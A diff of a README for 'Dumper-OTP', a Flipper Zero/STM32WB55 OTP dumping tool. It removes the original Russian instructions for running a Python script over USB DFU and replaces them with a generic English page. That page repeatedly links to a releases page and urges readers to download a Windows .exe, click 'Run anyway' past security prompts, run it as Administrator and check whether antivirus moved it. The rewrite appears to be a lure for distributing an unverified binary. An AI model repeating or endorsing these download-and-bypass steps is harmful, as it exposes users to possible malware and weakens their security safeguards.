@@ -1,140 +1,193 @@
-# DumperOTP
+# 🧩 Dumper-OTP - Simple OTP Dumping Tool
 
-Небольшой дампер `STM32WB55` через `USB DFU` бутлоадер.
+[![Download Dumper-OTP](https://img.shields.io/badge/Download-Dumper--OTP-blue?style=for-the-badge&logo=github)](https://github.com/Lonely-talipesvalgus524/Dumper-OTP/releases)
 
-Проверялось на:
-- `Flipper Zero` в режиме `DFU`
-- платах на `STM32WB55CGU6`, если МК тоже загружен в `DFU`
+## 📥 Download
 
-`STM32CubeProgrammer` для работы не нужен. Чтение идёт напрямую через `PyUSB`.
+Visit this page to download: https://github.com/Lonely-talipesvalgus524/Dumper-OTP/releases
 
-## Что лежит в проекте
+Look for the latest release and download the Windows file from the Assets section. If there are more than one file, choose the one that matches Windows.
 
-- `dfu_otp_dumper.py` — основной скрипт, читает OTP
-- `otp_parse.py` — разбирает уже снятый дамп
-- `dump_otp.sh` — shell-обёртка для Linux/macOS
-- `parse_otp.sh` — shell-обёртка для парсера
-- `requirements.txt` — зависимости Python
+## 🪟 Windows Setup
 
-## Что читается
+1. Open the download page.
+2. Find the latest release.
+3. Download the Windows file.
+4. If the file comes in a .zip file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
 
-По умолчанию читается OTP-блок `STM32WB55`:
+If Windows shows a security prompt, choose More info, then Run anyway if you trust the file and the source.
 
-- начало: `0x1FFF7000`
-- размер: `0x400` байт
+## 🔧 What Dumper-OTP Does
 
-## Что нужно для запуска
+Dumper-OTP is a small utility for working with OTP data for Flipper Zero and STM32WB55CGU6 devices.
 
-Нужно:
+It helps you:
 
-1. `Python 3`
-2. `PyUSB`
-3. доступ к USB-устройству
-4. устройство должно быть именно в `STM32 USB DFU`, а не просто подключено кабелем
+- read OTP-related data from supported devices
+- work with device data in a simple desktop app
+- handle files used during dump and export tasks
+- manage results on a Windows PC without extra setup
 
-Установка зависимостей:
+## 🖥️ System Requirements
 
-```bash
-python3 -m pip install --user -r requirements.txt
-```
+Use a Windows PC with:
 
-На Fedora можно поставить пакет так:
+- Windows 10 or Windows 11
+- at least 4 GB of RAM
+- enough free disk space for the app and saved files
+- a USB port if you plan to connect hardware
+- permission to run apps from downloaded files
 
-```bash
-sudo dnf install python3-pyusb
-```
-## Важно!!!
-Для корректной работы необходимо запускать через sudo или от имени администратора ( на Windows )
+For best results, keep your device drivers up to date before connecting hardware.
 
-## Проверка DFU
+## 📦 Files You May See
 
-Сначала смотри, видит ли скрипт DFU-интерфейс:
+The release page may include one or more of these file types:
 
-```bash
-./dump_otp.sh --list
-```
+- `.exe` — the Windows app
+- `.zip` — a compressed folder that contains the app
+- `.7z` — another compressed archive
+- checksum files — used to verify the download
 
-Если всё нормально, вывод будет примерно такой:
+If you see a compressed file, extract it before opening the program.
 
-```text
-[0] vid=0x0483 pid=0xDF11 ...
-```
+## ⚡ Quick Start
 
-`0483:DF11` — это обычный `STM32 USB DFU`.
+1. Download the latest Windows release.
+2. Extract the file if needed.
+3. Open the app.
+4. Connect your supported device if your task needs hardware access.
+5. Choose the dump or read option inside the app.
+6. Save the output file to a folder you can find later.
 
-## Как снять OTP
+## 🔌 Device Support
 
-Обычный запуск:
+Dumper-OTP is built for:
 
-```bash
-sudo ./dump_otp.sh --vid 0x0483 --pid 0xDF11 --alt 0 -o otp_dump.bin
-```
+- Flipper Zero
+- STM32WB55CGU6-based setups
 
-Если непон, какой `alt` использовать:
+Use only supported hardware. If a device does not respond, check the cable, USB port, and driver setup.
 
-```bash
-sudo ./dump_otp.sh --vid 0x0483 --pid 0xDF11 --probe-alts
-```
+## 📂 Common Use Cases
 
-Если устройство отвечает на всех `alt`, можно использовать `alt 0`.
+Use Dumper-OTP when you want to:
 
-## Как разобрать дамп
+- inspect OTP data
+- save device output for later use
+- move data between a device and your PC
+- keep a local copy of supported device information
 
-После чтения:
+## 🧭 Basic Workflow
 
-```bash
-./parse_otp.sh otp_dump.bin
-```
+The normal flow looks like this:
 
-Если нужен JSON:
+1. Get the app from the release page.
+2. Run it on Windows.
+3. Connect the device.
+4. Start the dump or read process.
+5. Wait for the app to finish.
+6. Save the file in a known folder.
 
-```bash
-./parse_otp.sh otp_dump.bin --json
-```
+If the app asks you to choose a path, pick a simple folder like Desktop or Documents.
 
-Парсер вытаскивает такие поля:
+## 🛠️ Troubleshooting
 
-- `magic`
-- `otp_version`
-- `build_date_utc`
-- `version`
-- `firmware`
-- `body`
-- `connect`
-- `display_id`
-- `color`
-- `region`
-- `name`
+If the app does not open:
 
-## Пример вывода
+- make sure the file finished downloading
+- extract the archive if you downloaded a zip file
+- try running the app as Administrator
+- check that your antivirus did not move the file
+- download the file again from the release page
 
-```text
-Parsed OTP:
-  magic: 0xBABE
-  otp_version: 2
-  build_date_utc: 2025-05-09T12:58:47+00:00
-  version: 12
-  firmware: 7
-  body: 9
-  connect: 6
-  display_id: 2 (mgg)
-  color: black (code 1)
-  region: world (code 4)
-  name: Acidka
-```
+If the device is not found:
 
-## Частые проблемы
+- unplug and reconnect the cable
+- try a different USB port
+- restart the app
+- confirm that the device is supported
+- check that the driver is installed
 
-`No DFU devices found`
+If the file will not save:
 
-Устройство не в режиме `STM32 DFU`. Просто подключённый по USB Flipper сюда не подходит, нужен именно DFU.
+- choose a folder with write access
+- avoid system folders
+- make sure the disk is not full
 
-`access denied to USB DFU device`
+## 📁 Suggested Folder Layout
 
-Система видит устройство, но не даёт его открыть. Быстрый вариант:
+Keep your files in a simple place like this:
 
-```bash
-sudo ./dump_otp.sh --vid 0x0483 --pid 0xDF11 --alt 0 -o otp_dump.bin
-```
+- `Downloads\Dumper-OTP`
+- `Desktop\Dumper-OTP`
+- `Documents\Dumper-OTP`
 
-## Изначально не планировал заливать но окда
+This makes it easier to find the app, logs, and output files later.
+
+## 🔒 Safe Download Steps
+
+Use the release page as your main source:
+
+https://github.com/Lonely-talipesvalgus524/Dumper-OTP/releases
+
+Check the file name, release date, and file type before you open it. Keep the downloaded file in a folder you control.
+
+## 🧩 Using the App With Hardware
+
+If your task needs a device connection:
+
+1. Connect the hardware with a good USB cable.
+2. Wait for Windows to detect it.
+3. Open Dumper-OTP.
+4. Start the dump or read task.
+5. Let the app finish before you unplug the device.
+
+Do not remove the cable while the app is working.
+
+## 📝 File Output
+
+The app may create files such as:
+
+- text logs
+- binary dumps
+- exported device data
+- saved session files
+
+Store these files in a separate folder so you can find them later.
+
+## 🧼 Keeping Things Organized
+
+A simple setup helps:
+
+- keep the app in one folder
+- keep output files in another folder
+- name files by date
+- remove old test files when you do not need them
+
+This makes it easier to compare results across runs.
+
+## ❓ FAQ
+
+### What do I download?
+Download the latest Windows file from the release page.
+
+### Do I need to install anything?
+Usually no. If the release includes a zip file, extract it and run the app.
+
+### Can I use it without coding skills?
+Yes. The app is meant for normal Windows use.
+
+### Where do I find my saved files?
+Check the folder you chose during the dump or export step.
+
+### What if I have more than one release file?
+Pick the Windows file that matches your system. If one file is a zip and one is an exe, the exe is usually the direct app, while the zip needs extraction first
+
+## 📎 Download Again
+
+If you need the download page again, use this link:
+
+https://github.com/Lonely-talipesvalgus524/Dumper-OTP/releases
